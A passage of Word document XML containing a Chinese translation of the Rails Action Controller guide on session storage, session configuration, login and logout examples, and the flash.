          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>default_url_options</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，如上例所示，它将会被用于所有的 URL 生成。该方法同样也可以被定义于某一具体的控制器，那样的话，它仅仅影响该控制器的 URL 生成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695D0C78"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4 Session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B4476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你的应用对每一个用户会有一个 session ，你可以在请求之间持久地存储少量数据。session 只有在控制器和视图中可用并且可以使用以下几种存储机制之一：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C237B1A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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ActionDispatch::Session::CookieStore – 存储所有东西在客户端上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283681FE" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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ActiveRecord::SessionStore – 通过 Active Record 存储数据到数据库库中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E25B654" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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ActionDispatch::Session::CacheStore – 存储数据在 Rails 的缓存中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D0922E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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ActionDispatch::Session::MemCacheStore – 存储数据到 memcached cluster 中（遗留实现；考虑使用 CacheStore 代替）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3784A42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所有session 存储使用一个 cookie 为每一个 session 存储一个唯一的 ID （你必须使用 cookie，Rails 不允许你在 URL 中传递 session ID 因为不太安全）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769999B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对于大多数存储，此 ID 用来在服务器查找 session 数据，例如在数据库表中。有一种例外，并且是默认和推荐的 session 存储 – CookieStore – 存储所有 session 数据在 cookie 本身 （如果你需要 ID， 它一样可用）。这种方法具有非常轻量级的优势并且它在新应用不需要任何设置以使用 session 。为了防止篡改， cookie 数据是经过加密签名的，但是没有经过加密编码，因此任何人可以获取到它就可以读到其内容但是不能编辑（如果它被编辑了 Rails 便不会接受它）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAC15B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CookieStore 能存储大约 4kb 的数据 — 相对其他方法少很多 — 但通常够用了。在 session 中存储大量数据是不被鼓励的，无论你的应用使用的是何种 session 存储方法。你尤其应该避免在session 中存储复杂对象（任何除基本 Ruby 对象的对象，最常见的例子即模型的实例），因为服务器可能会在请求之间无法重建它们而引起错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCA0BE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如果你的用户的 session 不存储关键数据或不需要长时间存在（例如你只是使用 flash 显示提示信息），你可以考虑使用 ActionDispatch::Session::CacheStore。这种方法将会使用你为你的应用配置好的 cache 实现存储 session。这样做的好处是你可以使用已有的cache 基础来存储 session 而不需要任何额外设置或管理。当然坏处是，session 会是昙花一现的并且很可能随时消失。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B36C76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在"安全指南":security.html 中阅读更多有关 session 存储的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8D70C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如果你需要不同的 session 存储机制，你可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/session_store.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中改变它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3E0BCD89" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="502C1D0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为 session 使用数据库代替默认的基于 cookie 的，不应用于存储高度机密的信息</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="476302E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（通过 "script/rails g session_migration" 创建 session 表）</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C73B5A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YourApp::Application.config.session_store :active_record_store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="65D8D7C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在签名 session 数据时会设定一个 session 键（cookie的名称）。这也可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/session_store.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中改变：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4BF39409" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4ADA294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当你修改此文件后确定重启你的服务器。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E6DA58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3F7378F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YourApp::Application.config.session_store :cookie_store, :key</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '_your_app_session'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A82F8F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你也可以传入一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：domain</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 键来指定 cookie 的域名：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6DE71885" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D969B9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当你修改此文件后确定重启你的服务器。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45DC952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3A51C45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YourApp::Application.config.session_store :cookie_store, :key</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '_your_app_session', :domain</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; ".example.com"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55A4A65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会设置（为CookieStore）一个密钥来签名 session 数据。可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/secret_token.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中改变</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="50AA9765" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="288F4E5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当你修改此文件后确定重启你的服务器。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CBC886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07C92DB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你的用来验证已签名的 cookie 完整性的密钥。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BEA65B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如果你更改密钥，所有旧的已签名 cookie 会无效！</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A4E1BB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确定密钥最少 30 个字符且全部随机，</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21891DD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别使用常规词否则你会暴露在字典攻击之下。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="244A47A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YourApp::Application.config.secret_token = '49d3f3de9ed86c74b94ad6bd0...'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B7EE87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在使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CookieStore</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时改变密钥会使所有已有 session 无效化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA8F0DB"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4.1 存取 Session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022CA9F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在你的控制器中你可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例方法存取 session。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06807F1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Session 都是惰性加载的。如果你在你的动作代码中没有存取 session ，它们不会被加载的。因此你永远不需要屏蔽 session，只要不存取它们就可以了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A981E2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Session 值是像哈希一样的键/值对。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1F6A1C69" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08C885C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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FC053C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6059AB6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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B10937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75F75CD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通过键 :current_user_id 查找含有存储在 session 中的 ID 的 User 。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DB12E3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这是一种在 Rails 应用中处理用户登录的常见方式；登录时设置几组 session 值</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0147084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然后登出时移除之。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D14DE1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current_user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4498D37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@_current_user</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>||= session[:current_user_id] &amp;&amp;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35F5BA5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User.find_by_id(session[:current_user_id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EFB451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7895A1B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44D0B8B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在session中存储某事物，像使用哈希一样把它赋给某键：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="74282D6E" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="164A424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LoginsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39DC9D4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xml:space="preserve">  # “创建”一个登录，也称“将用户登入” </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F8B0C6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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7466BFA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if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>user = User.authenticate(params[:username], params[:password])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24D432E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保存用户 ID 于 session 中于是</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BB1A6D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就可以在之后的请求中使用它了</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="695AD85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session[:current_user_id] = user.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D2AE8E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redirect_to root_url</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="523601E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7CF474F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493793A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4463C4E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在session中移除某事物，赋值给改键 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0725D29E" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4285BA2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LoginsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F42EA5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“删除” 一个登录，也称“将用户登出”</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65240D3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destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="331B4D5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从 session 中移除用户 id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39721CE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@_current_user</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= session[:current_user_id] = nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69CC9DA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redirect_to root_url</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69C88BD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4DA9D38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510DBDA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要重置整个 session, 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>reset_session</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1732A497"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4.2 闪存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE0E94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闪存是session的特殊部分，它在每次请求后清空。这意味着存储的值仅在下一次请求中可用，对于存储错误信息等非常有用。它的存取方式和session大体相同，就像使用哈希。让我们来使用登出动作作为例子。控制器可以发送一条显示在用户的下一次请求中的信息：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7296"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="18C94541" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B6334D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LoginsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17F0193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destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71033FE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session[:current_user_id] = nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24B71EE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flash[:notice] = "You have successfully logged out"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2028DD7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redirect_to root_url</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AC58A8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67613F6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7C72A05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注意使用闪存信息来作为重定向也是可以的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1F0FC7EA" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="547EC9C7" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1145123448"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>redirect_to root_url, :notice</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "You have successfully logged out"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B750FB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destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作会重定向到应用的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>root_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处，在那里闪存信息会显示。注意将由下一个动作来完全决定对之前的动作放到闪存中的事物做什么。显示最终错误，在应用的版型中提醒闪存信息是一种惯例：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6816"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="34111BB1" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14E8795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&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35837EE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 &lt;head/&gt; --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10A859A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&lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25835D0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 if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
